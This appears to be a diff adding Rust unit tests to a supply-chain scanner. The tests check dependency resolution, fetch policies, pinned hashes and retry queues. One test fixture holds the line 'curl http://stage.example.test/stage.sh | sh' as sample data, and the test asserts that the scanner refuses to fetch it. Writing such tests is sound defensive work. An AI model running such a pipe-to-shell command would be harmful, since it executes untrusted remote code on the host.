+        let resources = RESOURCES.get_or_init(|| Resources {
+            net: HttpFetch::new().unwrap(),
+            cache: BlobCache::with_dir("/tmp/dependency-gap-test-cache"),
+        });
+        let mut session =
+            FetchSession::new(report, &[], policy, resources, Reporter::Off, false, &[]);
+        session.pending = store;
+        session
+    }
+    #[test]
+    fn local_matching_requires_exact_identity_version_and_code() {
+        let supplied = report("bundle", "./index.js", true);
+        let local = LocalNpmPackages::from_report(&supplied);
+        assert_eq!(
+            local
+                .declared_coverage(&supplied, "source", &reference())
+                .as_deref(),
+            Some("bundle/node_modules/tool")
+        );
+        for purl in [
+            "pkg:npm/tool@2.0.0",
+            "pkg:npm/tool",
+            "pkg:npm/other@1.0.0",
+            "pkg:pypi/tool@1.0.0",
+        ] {
+            let mut r = reference();
+            r.locator = RefLocator::Purl(purl.into());
+            assert!(
+                local.declared_coverage(&supplied, "source", &r).is_none(),
+                "{purl}"
+            );
+        }
+        for (entry, code) in [
+            ("./index.js", false),
+            ("../index.js", true),
+            ("./missing.js", true),
+        ] {
+            let supplied = report("bundle", entry, code);
+            assert!(
+                LocalNpmPackages::from_report(&supplied)
+                    .declared_coverage(&supplied, "source", &reference())
+                    .is_none()
+            );
+        }
+    }
+    #[test]
+    fn local_matching_never_borrows_sibling_or_shadowed_installations() {
+        let mut supplied = report("bundle/other", "index.js", true);
+        supplied.files[0].path = "bundle/app/package-lock.json".into();
+        assert!(
+            LocalNpmPackages::from_report(&supplied)
+                .declared_coverage(&supplied, "source", &reference())
+                .is_none()
+        );
+        supplied = report("bundle", "index.js", true);
+        supplied.files[0].path = "bundle/app/package.json".into();
+        let shadow: cleave::types::FileAnalysis = serde_json::from_value(serde_json::json!({"id":3,"path":"bundle/app/node_modules/tool/package.json","file_type":"package_json","sha256":"shadow","size":1,"depth":1})).unwrap();
+        supplied.files.push(shadow);
+        assert!(
+            LocalNpmPackages::from_report(&supplied)
+                .declared_coverage(&supplied, "source", &reference())
+                .is_none()
+        );
+    }
+    #[test]
+    fn archive_root_installation_resolves_without_crossing_archive_boundary() {
+        let mut supplied = report("placeholder", "index.js", true);
+        for file in &mut supplied.files {
+            file.path = file.path.replace("placeholder/", "bundle.tar!!");
+        }
+        assert_eq!(
+            LocalNpmPackages::from_report(&supplied)
+                .declared_coverage(&supplied, "source", &reference())
+                .as_deref(),
+            Some("bundle.tar!!node_modules/tool")
+        );
+        supplied.files[0].path = "other.tar!!package-lock.json".into();
+        assert!(
+            LocalNpmPackages::from_report(&supplied)
+                .declared_coverage(&supplied, "source", &reference())
+                .is_none()
+        );
+    }
+    #[test]
+    fn local_matching_respects_alias_install_paths_and_incomplete_code() {
+        let mut supplied = report("archive.tar!!bundle", "index.js", true);
+        supplied.files[1].path = supplied.files[1]
+            .path
+            .replace("node_modules/tool", "node_modules/alias");
+        supplied.files[2].path = supplied.files[2]
+            .path
+            .replace("node_modules/tool", "node_modules/alias");
+        let mut r = reference();
+        r.context = Some(filefacts::DependencyContext {
+            scope: filefacts::DependencyScope::Runtime,
+            optional: false,
+            has_install_script: false,
+            installed_path: Some("node_modules/alias".into()),
+        });
+        assert!(
+            LocalNpmPackages::from_report(&supplied)
+                .declared_coverage(&supplied, "source", &r)
+                .is_some()
+        );
+        supplied.files[2]
+            .analysis_gaps
+            .record(cleave::types::AnalysisGap::SourceParseIncomplete);
+        assert!(
+            LocalNpmPackages::from_report(&supplied)
+                .declared_coverage(&supplied, "source", &r)
+                .is_none()
+        );
+    }
+    #[test]
+    fn supplied_unpinned_code_is_recorded_without_claiming_integrity() {
+        let mut supplied = report("bundle", "index.js", true);
+        let mut pass = session(
+            &supplied,
+            FetchPolicy {
+                deps: true,
+                depth: 1,
+                ..FetchPolicy::default()
+            },
+            None,
+        );
+        pass.run(&mut supplied, vec![("source".into(), vec![reference()])]);
+        let records = pass.finish(&mut supplied).records;
+        assert_eq!(records.len(), 1);
+        assert!(matches!(records[0].outcome, Outcome::Skipped));
+        assert!(records[0].pin_verified.is_none());
+        assert!(records[0].content_sha256.is_none());
+        assert!(
+            records[0]
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .contains("already analyzed")
+        );
+    }
+    #[test]
+    fn development_scope_does_not_outrank_runtime_unless_it_executes_hooks() {
+        let runtime = reference();
+        let mut dev = reference();
+        dev.context = Some(filefacts::DependencyContext {
+            scope: filefacts::DependencyScope::Development,
+            optional: false,
+            has_install_script: false,
+            installed_path: None,
+        });
+        assert!(dependency_execution_priority(&runtime) < dependency_execution_priority(&dev));
+        dev.context.as_mut().unwrap().has_install_script = true;
+        assert!(dependency_execution_priority(&dev) < dependency_execution_priority(&runtime));
+        let supplied = report("bundle", "missing.js", false);
+        let mut pass = session(
+            &supplied,
+            FetchPolicy {
+                deps: true,
+                include_dev_dependencies: false,
+                ..FetchPolicy::default()
+            },
+            None,
+        );
+        assert!(pass.select("source", vec![dev], 0, &mut 0).is_empty());
+        assert!(
+            pass.out.records[0]
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .contains("development-only")
+        );
+    }
+    #[test]
+    fn resumed_work_keeps_depth_pins_and_source_and_does_not_bypass_ci_scope() {
+        let dir = tempfile::tempdir().unwrap();
+        let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
+        let mut supplied = report("bundle", "missing.js", false);
+        let mut r = Reference::new(
+            RefLocator::Url("http://stage.example.test/stage.sh".into()),
+            RefKind::Command,
+            "shell",
+            "curl http://stage.example.test/stage.sh | sh",
+        );
+        r.offset = Some(17);
+        r.pinned_hash = Some(filefacts::PinnedHash {
+            algo: filefacts::HashAlgo::Sha256,
+            value: "a".repeat(64),
+        });
+        let entry = pending::Entry {
+            root_sha: "source".into(),
+            source_sha: "original-parent".into(),
+            hop: 3,
+            reference: r.clone(),
+            reason: "depth limit".into(),
+            redirect_credit: 0,
+        };
+        store.update(std::slice::from_ref(&entry), &[]).unwrap();
+        let mut pass = session(
+            &supplied,
+            FetchPolicy {
+                urls: true,
+                packages: true,
+                depth: 2,
+                ..FetchPolicy::default()
+            },
+            Some(store.clone()),
+        );
+        pass.run(&mut supplied, vec![]);
+        assert!(!pass.out.records.is_empty());
+        assert!(
+            pass.out.records[0]
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .contains("hop=3")
+        );
+        let saved = store.entries("source").unwrap();
+        assert_eq!(saved.len(), 1);
+        assert_eq!(saved[0].reference, r);
+        // Widening depth tries the same URL; the HTTPS guard refuses it before a socket.
+        let mut pass = session(
+            &supplied,
+            FetchPolicy {
+                urls: true,
+                packages: true,
+                depth: 4,
+                ..FetchPolicy::default()
+            },
+            Some(store.clone()),
+        );
+        pass.run(&mut supplied, vec![]);
+        assert_eq!(
+            pass.out.records[0].source_sha256.as_deref(),
+            Some("original-parent")
+        );
+        assert_eq!(pass.out.records[0].source_offset, Some(17));
+        assert!(matches!(
+            pass.out.records[0].outcome,
+            Outcome::Failed(FetchError::Refused(_))
+        ));
+        assert!(store.entries("source").unwrap().is_empty());
+        r.context = Some(filefacts::DependencyContext {
+            scope: filefacts::DependencyScope::Ci,
+            optional: false,
+            has_install_script: false,
+            installed_path: None,
+        });
+        store
+            .update(
+                &[pending::Entry {
+                    reference: r,
+                    hop: 0,
+                    ..entry
+                }],
+                &[],
+            )
+            .unwrap();
+        let mut pass = session(
+            &supplied,
+            FetchPolicy {
+                urls: true,
+                packages: true,
+                ci: false,
+                ..FetchPolicy::default()
+            },
+            Some(store.clone()),
+        );
+        pass.run(&mut supplied, vec![]);
+        assert!(pass.out.records.is_empty());
+        assert_eq!(store.entries("source").unwrap().len(), 1);
+    }
+    #[test]
+    fn timeout_defers_unvisited_references_and_keeps_integrity() {
+        let dir = tempfile::tempdir().unwrap();
+        let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
+        let mut supplied = report("bundle", "index.js", true);
+        let mut r = reference();
+        r.pinned_hash = Some(filefacts::PinnedHash {
+            algo: filefacts::HashAlgo::Sha512,
+            value: "PIN".into(),
+        });
+        let mut pass = session(
+            &supplied,
+            FetchPolicy {
+                deps: true,
+                ..FetchPolicy::default()
+            },
+            Some(store.clone()),
+        );
+        pass.deadline.at = Some(Instant::now());
+        pass.run(&mut supplied, vec![("source".into(), vec![r.clone()])]);
+        assert!(
+            pass.out.records[0]
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .contains("fetch timeout")
+        );
+        assert_eq!(store.entries("source").unwrap()[0].reference, r);
+    }
+    #[test]
+    fn conflicting_pins_have_distinct_fetch_work_keys() {
+        let mut first = reference();
+        first.pinned_hash = Some(filefacts::PinnedHash {
+            algo: filefacts::HashAlgo::Sha512,
+            value: "ONE".into(),
+        });
+        let mut second = first.clone();
+        second.pinned_hash.as_mut().unwrap().value = "TWO".into();
+        assert_ne!(fetch_work_key(&first), fetch_work_key(&second));
+    }
+}
+
+#[cfg(test)]
+mod retry_backlog_tests {
+    use super::*;
+    #[test]
+    fn budget_transient_and_partial_work_remain_pending_but_permanent_refusals_do_not() {
+        static RESOURCES: OnceLock<Resources> = OnceLock::new();
+        let resources = RESOURCES.get_or_init(|| Resources {
+            net: HttpFetch::new().unwrap(),
+            cache: BlobCache::with_dir("/tmp/atomscan-backlog-test-cache"),
+        });
+        for (outcome, expected) in [
+            (Outcome::BudgetExceeded, true),
+            (Outcome::Failed(FetchError::Timeout), true),
+            (Outcome::Failed(FetchError::Transport("DNS".into())), true),
+            (Outcome::Failed(FetchError::Status(503)), true),
+            (
+                Outcome::Failed(FetchError::Refused("private".into())),
+                false,
+            ),
+            (Outcome::Failed(FetchError::Status(404)), false),
+        ] {
+            let dir = tempfile::tempdir().unwrap();
+            let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
+            let mut report: AnalysisReport = serde_json::from_value(serde_json::json!({"version":"3","files":[{"id":0,"path":"sample","file_type":"javascript","sha256":"root","size":1,"depth":0}]})).unwrap();
+            let r = Reference::new(
+                RefLocator::Purl("pkg:npm/pkg@1.0.0".into()),
+                RefKind::Dependency,
+                "lock",
+                "pkg",
+            );
+            let entry = pending::Entry {
+                root_sha: "root".into(),
+                source_sha: "source".into(),
+                hop: 2,
+                reference: r.clone(),
+                reason: "in progress".into(),
+                redirect_credit: 0,
+            };
+            store.update(&[entry], &[]).unwrap();
+            let mut session = FetchSession::new(
+                &report,
+                &[],
+                FetchPolicy {
+                    deps: true,
+                    ..FetchPolicy::default()
+                },
+                resources,
+                Reporter::Off,
+                false,
+                &[],
+            );
+            session.pending = Some(store.clone());
+            session.current_hop = 2;
+            let mut record = FetchRecord::terminal("pkg:npm/pkg@1.0.0".into(), outcome);
+            record.source_sha256 = Some("source".into());
+            session.merge_group(
+                &mut report,
+                GroupFetch {
+                    source_sha: "source".into(),
+                    registries: vec![],
+                    landed: vec![Landed {
+                        reference: r,
+                        record,
+                        standing: Standing::Analyze,
+                    }],
+                },
+                GroupAnalysis {
+                    registries: vec![],
+                    payloads: vec![None],
+                },
+                &mut vec![],
+            );
+            assert_eq!(!store.entries("root").unwrap().is_empty(), expected);
+        }
+    }
+    #[test]
+    fn all_versions_audit_keeps_an_older_pinned_release() {
+        static RESOURCES: OnceLock<Resources> = OnceLock::new();
+        let resources = RESOURCES.get_or_init(|| Resources {
+            net: HttpFetch::new().unwrap(),
+            cache: BlobCache::with_dir("/tmp/atomscan-versions-test-cache"),
+        });
+        let report: AnalysisReport =
+            serde_json::from_value(serde_json::json!({"version":"3","files":[]})).unwrap();
+        let r = Reference::new(
+            RefLocator::Purl("pkg:npm/pkg@1.0.0".into()),
+            RefKind::Dependency,
+            "lock",
+            "pkg",
+        );
+        let mut session = FetchSession::new(
+            &report,
+            &[],
+            FetchPolicy {
+                deps: true,
+                ..FetchPolicy::default()
+            },
+            resources,
+            Reporter::Off,
+            false,
+            &[],
+        );
+        session.newest.insert("pkg:npm/pkg".into(), "2.0.0".into());
+        let mut skipped = 0;
+        assert!(!session.newest_version(&r, &mut skipped));
+        assert_eq!(skipped, 1);
+        session.policy.all_versions = true;
+        assert!(session.newest_version(&r, &mut skipped));
+        assert_eq!(skipped, 1);
+    }
+}
+
+#[cfg(test)]
+mod scope_inheritance_tests {
+    use super::*;
+    #[test]
+    fn dependency_context_follows_build_dev_and_ci_edges_without_losing_hooks() {
+        for scope in [
+            filefacts::DependencyScope::Build,
+            filefacts::DependencyScope::Development,
+            filefacts::DependencyScope::Ci,
+        ] {
+            let mut parent = Reference::new(
+                RefLocator::Purl("pkg:npm/parent".into()),
+                RefKind::Dependency,
+                "lock",
+                "parent",
+            );
+            parent.context = Some(filefacts::DependencyContext {
+                scope,
+                optional: true,
+                has_install_script: false,
+                installed_path: None,
+            });
+            let mut child = Reference::new(
+                RefLocator::Purl("pkg:npm/child".into()),
+                RefKind::Dependency,
+                "lock",
+                "child",
+            );
+            child.context = Some(filefacts::DependencyContext {
+                scope: filefacts::DependencyScope::Runtime,
+                optional: false,
+                has_install_script: true,
+                installed_path: Some("node_modules/child".into()),
+            });
+            let mut groups = vec![("source".into(), vec![child])];
+            inherit_dependency_context(&parent, &mut groups);
+            let context = groups[0].1[0].context.as_ref().unwrap();
+            assert_eq!(context.scope, scope);
+            assert!(context.optional);
+            assert!(context.has_install_script);
+            assert_eq!(
+                context.installed_path.as_deref(),
+                Some("node_modules/child")
+            );
+        }
     }
 }
